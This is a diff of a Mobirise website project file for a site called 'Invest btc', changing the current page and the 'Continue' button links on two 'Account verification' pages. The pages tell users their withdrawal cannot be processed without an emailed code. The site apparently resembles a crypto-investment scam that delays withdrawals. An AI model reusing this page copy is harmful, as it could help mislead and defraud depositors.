@@ -1,7 +1,7 @@
 {
   "settings": {
     "name": "Invest btc",
-    "currentPage": "verify2",
+    "currentPage": "verify",
     "theme": {
       "name": "mobirise3",
       "title": "Mobirise 3",
@@ -4759,7 +4759,7 @@
           },
           "title": "Account verification",
           "text": "You need to verify that you are the owner of this accout by clicking on verify email, a verification code will be sent to your email,login and copy the code then come back here and click continue to process your withdrawal<br>NOTE: your withdrawal cannot be processed without the verification code",
-          "buttons": "<a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/verify\" data-toolbar=\"-mbrBtnMove\">Verify Email</a> <a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/withdraw\" data-toolbar=\"-mbrBtnMove\">Continue</a>  <a data-app-btn=\"true\" class=\"btn btn-lg btn-danger-outline btn-danger\" href=\"http://investbtcoin.yn.lt/index\" data-toolbar=\"-mbrBtnMove\">Logout</a>"
+          "buttons": "<a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/verify\" data-toolbar=\"-mbrBtnMove\">Verify Email</a> <a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/withdraw fund\" data-toolbar=\"-mbrBtnMove\">Continue</a>  <a data-app-btn=\"true\" class=\"btn btn-lg btn-danger-outline btn-danger\" href=\"http://investbtcoin.yn.lt/index\" data-toolbar=\"-mbrBtnMove\">Logout</a>"
         }
       ]
     },
@@ -4887,7 +4887,7 @@
           },
           "title": "Account Verification",
           "text": "Your verification code was sent into your email, login and copy the code then come back here and click continue to process your withdrawal<br>NOTE: your withdrawal cannot be processed without the verification code",
-          "buttons": "<a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/verify\" data-toolbar=\"-mbrBtnMove\">Resend Verify Email</a> <a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/withdraw\" data-toolbar=\"-mbrBtnMove\">Continue</a>  <a data-app-btn=\"true\" class=\"btn btn-lg btn-danger-outline btn-danger\" href=\"http://investbtcoin.yn.lt/index\" data-toolbar=\"-mbrBtnMove\">Logout</a>"
+          "buttons": "<a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/verify\" data-toolbar=\"-mbrBtnMove\">Resend Verify Email</a> <a data-app-btn=\"true\" class=\"btn btn-lg btn-info\" href=\"http://investbtcoin.yn.lt/withdraw fund\" data-toolbar=\"-mbrBtnMove\">Continue</a>  <a data-app-btn=\"true\" class=\"btn btn-lg btn-danger-outline btn-danger\" href=\"http://investbtcoin.yn.lt/index\" data-toolbar=\"-mbrBtnMove\">Logout</a>"
         }
       ]
     }
